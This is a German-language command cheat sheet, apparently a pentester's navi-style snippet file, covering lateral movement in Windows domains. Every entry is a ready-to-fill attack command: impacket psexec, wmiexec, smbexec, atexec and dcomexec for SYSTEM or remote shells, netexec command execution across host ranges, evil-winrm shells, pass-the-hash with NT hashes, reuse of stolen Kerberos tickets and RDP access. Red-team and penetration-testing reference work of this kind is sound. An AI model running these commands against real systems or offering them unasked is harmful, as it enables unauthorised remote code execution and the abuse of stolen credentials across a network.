# MENU

#plateform/linux #target/remote #cat/LATERAL

% p-lateral, boris, exec, movement, psexec, impacket, system, service, laut
## [LAT-a] impacket-psexec - SYSTEM-Shell (Dienst, laut/AV-verdaechtig)
target IP ok (NTLM). PtH: -hashes :<nthash>. Kerberos: -k -no-pass + dc_fqdn.
```
impacket-psexec '<domain>/<user>:<password>@<target_fqdn>'
```

% p-lateral, boris, exec, movement, wmiexec, impacket, wmi, leise, stealth
## [LAT-b] impacket-wmiexec - halb-interaktiv (WMI, leiser, kein Dienst)
```
impacket-wmiexec '<domain>/<user>:<password>@<target_fqdn>'
```

% p-lateral, boris, exec, movement, smbexec, impacket, smb, service
## [LAT-c] impacket-smbexec - SYSTEM via SMB (kein Datei-Drop wie psexec)
```
impacket-smbexec '<domain>/<user>:<password>@<target_fqdn>'
```

% p-lateral, boris, exec, movement, atexec, impacket, scheduledtask, einzelbefehl
## [LAT-d] impacket-atexec - Einzelbefehl via Scheduled Task
```
impacket-atexec '<domain>/<user>:<password>@<target_fqdn>' 'whoami'
```

% p-lateral, boris, exec, movement, dcomexec, impacket, dcom
## [LAT-e] impacket-dcomexec - Exec via DCOM (MMC20/ShellWindows)
```
impacket-dcomexec '<domain>/<user>:<password>@<target_fqdn>'
```

% p-lateral, boris, exec, movement, nxc, command, execmethod, multihost, netexec
## [LAT-f] nxc - Befehl auf vielen Hosts (--exec-method smbexec/wmiexec/atexec)
```
nxc smb <target_range> -u <user> -p '<password>' -d <domain> -x 'whoami' --exec-method smbexec
```

% p-lateral, boris, exec, movement, evilwinrm, winrm, shell, 5985, interaktiv
## [LAT-g] evil-winrm - interaktive WinRM-Shell (Port 5985/5986)
PtH: -H <nthash>. Kerberos: -r <domain> (KRB5CCNAME gesetzt).
```
evil-winrm -i <target_fqdn> -u <user> -p '<password>'
```

% p-lateral, boris, exec, movement, pth, passthehash, nthash, nxc, netexec
## [LAT-h] Pass-the-Hash - nxc (ueberall -H <nthash> statt -p)
```
nxc smb <target_range> -u <user> -H <nthash> -d <domain>
```

% p-lateral, boris, exec, movement, kerberos, kcache, usekcache, ticket, ccache, ptt
## [LAT-i] Kerberos-Ticket nutzen (kcache; Quelle: getST/RBCD/Golden-Ticket)
Erst KRB5CCNAME setzen, dann Zugriff. Braucht target_fqdn (Kerberos, kein IP).
```
export KRB5CCNAME=<ccache|administrator.ccache>; nxc smb <target_fqdn> --use-kcache -x 'whoami'
```

% p-lateral, boris, exec, movement, rdp, xfreerdp, remotedesktop, pth
## [LAT-j] xfreerdp - RDP (PtH mit /pth:<nthash> statt /p)
```
xfreerdp /v:<target_fqdn> /u:<user> /d:<domain> /p:'<password>' /cert:ignore +clipboard /dynamic-resolution
```
